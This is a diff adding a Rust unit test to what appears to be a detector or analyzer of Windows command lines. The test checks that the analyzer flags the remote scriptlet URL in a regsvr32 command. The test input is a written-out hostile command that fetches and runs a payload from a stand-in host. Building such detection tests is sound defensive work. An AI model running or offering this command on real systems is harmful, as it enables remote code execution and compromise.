@@ -6858,6 +6858,30 @@ mod msiexec_tests {
 }
 
 #[cfg(test)]
+mod regsvr32_tests {
+    use crate::env::{Config, Environment};
+    use crate::interp::interpret_line;
+    use crate::traits::Trait;
+
+    #[test]
+    fn regsvr32_scriptlet_url_argument_emits_typed_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "regsvr32 /s /n /u /i:http://regsvr32-direct.example/payload.sct scrobj.dll",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { url, .. }
+                    if url == "http://regsvr32-direct.example/payload.sct"
+            )
+        });
+        assert!(has, "regsvr32 scriptlet URL not typed: {:?}", env.traits);
+    }
+}
+
+#[cfg(test)]
 mod misc_handler_tests {
     use crate::env::{Config, Environment, FsEntry};
     use crate::interp::interpret_line;
